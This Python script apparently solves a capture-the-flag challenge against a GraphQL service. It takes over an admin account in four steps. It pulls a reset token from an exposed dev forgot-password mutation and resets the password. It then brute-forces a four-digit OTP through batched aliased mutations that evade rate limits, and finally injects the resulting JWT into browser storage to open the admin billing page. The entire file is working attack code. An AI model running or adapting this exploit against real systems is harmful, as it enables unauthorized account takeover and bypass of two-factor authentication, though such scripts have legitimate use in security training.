#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import re
import time
import os
import webbrowser
from urllib.parse import urljoin


def post_json(url, payload, headers=None):
    headers = {'Content-Type': 'application/json'}
    if headers:
        headers.update(headers)
    response = requests.post(url, headers=headers, json=payload)
    response.raise_for_status()
    return response.json()


def extract_uuid(text):
    match = re.search(r'([0-9a-fA-F\-]{36,})', text)
    return match.group(1) if match else None


def get_reset_token(graphql_url, email):
    print(f"Requesting reset token for {email}...")
    query = f"mutation {{ devForgotPassword(email: \"{email}\") }}"
    data = post_json(graphql_url, {'query': query})
    token = extract_uuid(data['data']['devForgotPassword'])
    print(f"Reset token: {token}")
    return token


def reset_password(graphql_url, token, new_password):
    print("Resetting password...")
    query = f"mutation {{ resetPassword(token: \"{token}\", newPassword: \"{new_password}\") }}"
    result = post_json(graphql_url, {'query': query})
    print(result['data']['resetPassword'])


def start_login(graphql_url, email, password):
    print(f"Logging in {email} to get 2FA session...")
    query = f"mutation {{ login(email: \"{email}\", password: \"{password}\") {{ token }} }}"
    resp = post_json(graphql_url, {'query': query})
    session = extract_uuid(resp['errors'][0]['message'])
    print(f"2FA session: {session}")
    return session


def brute_force_otp(graphql_url, session, batch_size, interval, total=10000):
    print(f"Brute-forcing OTP in batches of {batch_size}...")
    for start in range(0, total, batch_size):
        end = min(start + batch_size, total)
        fields = []
        for code in range(start, end):
            otp = f"{code:04d}"
            fields.append(f"m{otp}: verifyTwoFactor(token: \"{session}\", otp: \"{otp}\") {{ token }}")
        query = "mutation { " + ' '.join(fields) + ' }'
        print(f"Trying {start:04d}-{end-1:04d}")
        data = post_json(graphql_url, {'query': query})['data']
        for key, val in data.items():
            if val and 'token' in val:
                found = key.lstrip('m')
                jwt = val['token']
                print(f"Found OTP {found}")
                return jwt
        time.sleep(interval)
    raise RuntimeError("OTP brute-force failed")


def open_admin(graphql_url, jwt, billing_path='/billing'):
    print(f"Admin JWT: {jwt}")
    url = urljoin(graphql_url.rsplit('/', 1)[0], billing_path)
    html = f"""
<html><body><script>
  localStorage.setItem('token','{jwt}');
  window.location='{url}';
</script></body></html>"""
    tmp = 'admin.html'
    with open(tmp, 'w') as f:
        f.write(html)
    webbrowser.open('file://' + os.path.abspath(tmp))


def main():
    parser = argparse.ArgumentParser(description='GraphQL Admin Takeover Script')
    parser.add_argument('--url', default='http://83.136.253.59:31498/graphql', help='GraphQL endpoint')
    parser.add_argument('--email', default='admin@speednet.htb', help='Admin email')
    parser.add_argument('--password', default='P@ssw0rd123!', help='New admin password')
    parser.add_argument('--batch-size', type=int, default=500, help='OTP batch size')
    parser.add_argument('--interval', type=int, default=2, help='Seconds between batches')
    parser.add_argument('--billing', default='/billing', help='Directory/Page URL path')
    args = parser.parse_args()

    token = get_reset_token(args.url, args.email)
    reset_password(args.url, token, args.password)
    time.sleep(1)
    session = start_login(args.url, args.email, args.password)
    time.sleep(1)
    jwt = brute_force_otp(args.url, session, args.batch_size, args.interval)
    open_admin(args.url, jwt, args.billing)

if __name__ == '__main__':
    main()

